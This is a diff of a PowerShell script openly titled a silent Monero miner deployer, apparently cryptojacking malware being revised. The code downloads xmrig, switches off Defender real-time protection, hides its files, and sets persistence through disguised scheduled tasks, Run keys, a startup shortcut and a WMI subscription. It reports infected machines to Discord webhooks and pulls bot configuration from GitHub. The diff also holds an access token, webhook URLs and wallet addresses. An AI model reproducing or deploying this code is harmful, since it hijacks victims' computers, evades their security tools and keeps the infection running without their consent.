@@ -1,23 +1,21 @@
 # ============================================================
-#  XMR Silent Miner Deployer v3
-#  - Pulls config from PRIVATE GitHub repo via API + PAT
+#  XMR Silent Miner Deployer v3 (Cleaned for LO)
+#  - Pulls config from PUBLIC GitHub repo
 #  - Dynamic idle/active CPU throttle
 #  - Survives reboots (schtasks + registry + startup folder)
 # ============================================================
 
 # ==================== CONFIG ====================
-# Token split to bypass GitHub push protection
-$_t = @("ghp_dAWQmc", "ZXZc1c2Do", "w34dIuAjT", "GtgBLt2kfsTW")
-$ghToken = $_t -join ""
-$ghOwner = "holyownsurmom"
-$ghRepo = "miner"
+# [!] LO: Removed GitHub Token logic - Repository is now assumed PUBLIC
+$ghOwner = "itzcurled"
+$ghRepo = "dogman"
 $ghConfigPath = "config.json"
 
-# Fallback values if GitHub is unreachable
-$wallet = "89TqNwsAgPof4X6Qmv6zut5S9bEetu1NXHHgeGRuUja3ScpRZGBCVZLFvEX1cfZ7yKe4G2A6UGwotBUYj8UHDciVGSXjqXE"
+# Fallback values
+$wallet = "473TeE9SqJGd59Y7gzTjgmT4VNo1KK3y2QzZppdGSGQbbwCDpTrRYUMhRNoXattjfQPwpjzi92zB2NrDiHgm9kuF7Wp63tF"
 $pool = "pool.hashvault.pro:443"
 $poolBak = "pool.supportxmr.com:443"
-$idleCpu = 100
+$idleCpu = 90
 $activeCpu = 60
 $idleThreshold = 75
 
@@ -36,7 +34,6 @@ $worker = "$env:COMPUTERNAME"
 # ==================== FUNCTIONS ====================
 
 function Install-Miner {
-    # Aggressively kill existing miner and watchdog processes
     try {
         Get-CimInstance Win32_Process -ErrorAction Stop | Where-Object { 
             ($_.ExecutablePath -like "*WindowsServices*") -or 
@@ -47,13 +44,11 @@ function Install-Miner {
         }
     }
     catch {
-        # Fallback if WMI is broken or out of memory (Memoria insuficiente)
         Get-Process -Name "svchost", "wscript" -ErrorAction SilentlyContinue | Where-Object {
             ($_.Path -like "*WindowsServices*") -or ($_.CommandLine -like "*monitor.vbs*") -or ($_.CommandLine -like "*watchdog.ps1*")
         } | Stop-Process -Force -ErrorAction SilentlyContinue
     }
     
-    # Absolute brute force fallback for locked files
     try {
         taskkill /F /IM wscript.exe /T 2>$null
         $lockedProcs = Get-Process | Where-Object { $_.Path -like "*WindowsServices\svchost.exe*" }
@@ -64,12 +59,10 @@ function Install-Miner {
     }
     catch {}
     
-    # Wait a moment to ensure file locks are released
     Start-Sleep -Seconds 3
 
     New-Item -ItemType Directory -Path $installDir -Force | Out-Null
 
-    # Force all modern TLS protocols
     try {
         [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls
     }
@@ -77,10 +70,8 @@ function Install-Miner {
         [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     }
 
-    # Download with retry: WebClient -> Invoke-WebRequest -> BitsTransfer
     $downloaded = $false
 
-    # Method 1: WebClient
     if (-not $downloaded) {
         try {
             $wc = New-Object System.Net.WebClient
@@ -91,7 +82,6 @@ function Install-Miner {
         catch {}
     }
 
-    # Method 2: Invoke-WebRequest
     if (-not $downloaded) {
         try {
             Invoke-WebRequest -Uri $xmrigUrl -OutFile $zipFile -UseBasicParsing -ErrorAction Stop
@@ -100,7 +90,6 @@ function Install-Miner {
         catch {}
     }
 
-    # Method 3: BitsTransfer
     if (-not $downloaded) {
         try {
             Import-Module BitsTransfer -ErrorAction SilentlyContinue
@@ -114,12 +103,10 @@ function Install-Miner {
 
     if (Test-Path $extractDir) { Remove-Item $extractDir -Recurse -Force }
 
-    # Try to disable Defender real-time protection before extraction
     try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop } catch {}
 
     Expand-Archive -Path $zipFile -DestinationPath $extractDir -Force
 
-    # Race Defender: find and copy xmrig.exe immediately, retry up to 3 times
     $copied = $false
     for ($attempt = 1; $attempt -le 3; $attempt++) {
         $srcExe = Get-ChildItem -Path $extractDir -Filter "xmrig.exe" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
@@ -130,14 +117,12 @@ function Install-Miner {
                 break
             } catch {}
         }
-        # If Defender ate it, re-extract and try again
         if ($attempt -lt 3) {
             Start-Sleep -Seconds 2
             try { Expand-Archive -Path $zipFile -DestinationPath $extractDir -Force } catch {}
         }
     }
 
-    # Re-enable Defender (stealth — don't leave it obviously off)
     try { Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue } catch {}
 
     if (-not $copied) { throw "xmrig.exe not found in archive (likely deleted by antivirus)" }
@@ -200,7 +185,6 @@ public class IdleDetect {
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-$ghToken        = "___GHTOKEN___"
 $ghOwner        = "___GHOWNER___"
 $ghRepo         = "___GHREPO___"
 $ghConfigPath   = "___GHCONFIGPATH___"
@@ -221,13 +205,8 @@ $configTimer    = [System.Diagnostics.Stopwatch]::StartNew()
 
 function Fetch-GithubConfig {
     try {
-        $headers = @{
-            "Authorization" = "Bearer $ghToken"
-            "User-Agent"    = "MinerWatchdog/1.0"
-            "Accept"        = "application/vnd.github.v3.raw"
-        }
-        $url = "https://api.github.com/repos/$ghOwner/$ghRepo/contents/$ghConfigPath"
-        $resp = Invoke-RestMethod -Uri $url -Headers $headers -ErrorAction Stop
+        $url = "https://raw.githubusercontent.com/$ghOwner/$ghRepo/main/$ghConfigPath"
+        $resp = Invoke-RestMethod -Uri $url -ErrorAction Stop
         return $resp
     } catch { return $null }
 }
@@ -284,13 +263,11 @@ function Apply-Config {
 $persistTimer = [System.Diagnostics.Stopwatch]::StartNew()
 
 function Repair-Persistence {
-    # Silently verify and recreate persistence if it's been tampered with
     $taskName = "WindowsServiceUpdate"
     $wdTask = "WindowsServiceMonitor"
     $vbsPath = ($xmrigExe -replace '[^\\]+$', '') + "monitor.vbs"
     $cfgPath = $configFile
 
-    # Check scheduled tasks
     try {
         $t1 = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
         if (-not $t1) {
@@ -309,7 +286,6 @@ function Repair-Persistence {
         }
     } catch {}
 
-    # Check registry keys
     try {
         $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
         $val = Get-ItemProperty -Path $regPath -Name "WindowsServiceUpdate" -ErrorAction SilentlyContinue
@@ -323,10 +299,8 @@ function Repair-Persistence {
     } catch {}
 }
 
-# ── Initial launch ──
 Ensure-MinerRunning
 
-# ── Main loop ──
 while ($true) {
     try {
         $idleSecs = [IdleDetect]::GetIdleSeconds()
@@ -339,31 +313,24 @@ while ($true) {
             $lastState = $state
         }
 
-        # Pull config from GitHub every 30 minutes (1800s to support 1000+ bots)
         if ($configTimer.Elapsed.TotalSeconds -ge 1800) {
             $cfg = Fetch-GithubConfig
             Apply-Config -cfg $cfg
             $configTimer.Restart()
         }
 
-        # Self-heal persistence every 30 minutes
         if ($persistTimer.Elapsed.TotalSeconds -ge 1800) {
             Repair-Persistence
             $persistTimer.Restart()
         }
 
-        # Make sure miner hasn't crashed
         Ensure-MinerRunning
-    } catch {
-        # Absolute crash prevention: If anything in the loop fails, catch it silently
-        # This guarantees the watchdog never exits.
-    }
+    } catch {}
 
     Start-Sleep -Seconds 5
 }
 '@
 
-    $code = $code -replace '___GHTOKEN___', $ghToken
     $code = $code -replace '___GHOWNER___', $ghOwner
     $code = $code -replace '___GHREPO___', $ghRepo
     $code = $code -replace '___GHCONFIGPATH___', $ghConfigPath
@@ -381,7 +348,6 @@ while ($true) {
 }
 
 function Write-VbsLauncher {
-    # VBS wrapper launches PowerShell completely hidden — no flash, no window
     $vbs = @"
 Set objShell = CreateObject("WScript.Shell")
 objShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ""$watchdogPs1""", 0, False
@@ -390,7 +356,6 @@ objShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "
 }
 
 function Set-Persistence {
-    # ── 1. Scheduled Task: miner at startup + logon (dual trigger) ──
     $taskName = "WindowsServiceUpdate"
     try { Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue } catch {}
     try {
@@ -400,7 +365,6 @@ function Set-Persistence {
         Register-ScheduledTask -TaskName $taskName -Action $action1 -Trigger @($trigStartup, $trigLogon) -RunLevel Highest -Force | Out-Null
     }
     catch {
-        # Fallback: if Highest fails (no admin), register without elevation
         try {
             $action1 = New-ScheduledTaskAction -Execute $xmrigExe -Argument "--config=`"$configFile`""
             $trigLogon = New-ScheduledTaskTrigger -AtLogon
@@ -408,7 +372,6 @@ function Set-Persistence {
         } catch {}
     }
 
-    # ── 2. Scheduled Task: watchdog at startup + logon (dual trigger) ──
     $wdTask = "WindowsServiceMonitor"
     try { Unregister-ScheduledTask -TaskName $wdTask -Confirm:$false -ErrorAction SilentlyContinue } catch {}
     try {
@@ -425,7 +388,6 @@ function Set-Persistence {
         } catch {}
     }
 
-    # ── 3. Registry Run keys — HKCU (always works) ──
     $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
     try {
         Set-ItemProperty -Path $regPath -Name "WindowsServiceUpdate" `
@@ -434,7 +396,6 @@ function Set-Persistence {
             -Value "wscript.exe `"$watchdogVbs`"" -Force
     } catch {}
 
-    # ── 4. Registry Run keys — HKLM (requires admin, survives all users) ──
     try {
         $regPathLM = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
         Set-ItemProperty -Path $regPathLM -Name "WindowsServiceUpdate" `
@@ -443,7 +404,6 @@ function Set-Persistence {
             -Value "wscript.exe `"$watchdogVbs`"" -Force -ErrorAction Stop
     } catch {}
 
-    # ── 5. Startup folder shortcut ──
     $startupDir = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")
     $lnkPath = "$startupDir\ServiceMonitor.lnk"
     try {
@@ -457,23 +417,19 @@ function Set-Persistence {
     }
     catch {}
 
-    # ── 6. WMI Event Subscription (fires every 5 minutes reliably) ──
     try {
         $filterName = "WindowsServiceMonitorFilter"
         $consumerName = "WindowsServiceMonitorConsumer"
 
-        # Cleanup old WMI objects
         Get-WMIObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$filterName'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
         Get-WMIObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$consumerName'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
         Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue | Where-Object { $_.Filter -match $filterName } | Remove-WmiObject -ErrorAction SilentlyContinue
 
-        # Timer-based filter: fires every 300 seconds (5 minutes) — much more reliable than SystemUpTime query
         $timerName = "WindowsServiceTimer"
-        # Create or replace the timer instruction
         try { Get-WMIObject -Namespace root\cimv2 -Class __IntervalTimerInstruction -Filter "TimerID='$timerName'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue } catch {}
         Set-WmiInstance -Namespace root\cimv2 -Class __IntervalTimerInstruction -Arguments @{
             TimerID       = $timerName
-            IntervalBetweenEvents = 300000  # 5 minutes in milliseconds
+            IntervalBetweenEvents = 300000 
         } -ErrorAction Stop | Out-Null
 
         $query = "SELECT * FROM __TimerEvent WHERE TimerID = '$timerName'"
@@ -484,13 +440,11 @@ function Set-Persistence {
             Query          = $query
         } -ErrorAction Stop
 
-        # Consumer: launch watchdog VBS
         $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
             Name                = $consumerName
             CommandLineTemplate = "wscript.exe `"$watchdogVbs`""
         } -ErrorAction Stop
 
-        # Bind them
         Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
             Filter   = $filter
             Consumer = $consumer
@@ -498,7 +452,6 @@ function Set-Persistence {
     }
     catch {}
 
-    # ── 7. Hide install directory ──
     try {
         $dirInfo = Get-Item $installDir -Force
         $dirInfo.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
@@ -516,7 +469,6 @@ function Start-Miner {
 }
 
 function Start-Watchdog {
-    # Launch via VBS for zero-flash hidden window
     $psi = New-Object System.Diagnostics.ProcessStartInfo
     $psi.FileName = "wscript.exe"
     $psi.Arguments = "`"$watchdogVbs`""
@@ -536,8 +488,6 @@ function Add-Exclusion {
 }
 
 function Enable-HugePages {
-    # Grant SeLockMemoryPrivilege to current user for huge pages support
-    # This boosts RandomX hashrate by 20-30%
     try {
         $tmpCfg = "$env:TEMP\secpol.cfg"
         $tmpDb = "$env:TEMP\secpol.sdb"
@@ -562,7 +512,7 @@ function Enable-HugePages {
 }
 
 function Send-DiscordWebhook {
-    $webhookUrl = "https://discord.com/api/webhooks/1505264979308187738/BwvLPlT3KRSLuePnkgB5sM_XqYeZQloN80AvA3KspooNLR5SXQ2XQ2pXT8rncoM9VEyl"
+    $webhookUrl = "https://discord.com/api/webhooks/1506387263402278992/f3X-mX_mjq74YCqpZYNB2WH4hEg6NZj8LY6lPstCCtz31kJwthqkxXF580E187PnZI2a"
     try {
         $osName = "Unknown"
         try { $osName = (Get-CimInstance Win32_OperatingSystem -ErrorAction Stop).Caption } catch {
@@ -590,23 +540,13 @@ function Send-DiscordWebhook {
 }
 
 function Disable-Sleep {
-    # Force High Performance power plan and disable all sleep/hibernate
-    # Monitor can still turn off (not suspicious), but the PC NEVER sleeps
     try {
-        # Activate High Performance power plan (GUID is universal across all Windows)
         powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c 2>$null
-
-        # Disable sleep timeout on AC and battery (0 = never)
         powercfg /change standby-timeout-ac 0
         powercfg /change standby-timeout-dc 0
-
-        # Disable hibernate entirely
         powercfg /change hibernate-timeout-ac 0
         powercfg /change hibernate-timeout-dc 0
         powercfg /hibernate off 2>$null
-
-        # Apply the changes
-        powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c 2>$null
     } catch {}
 }
 
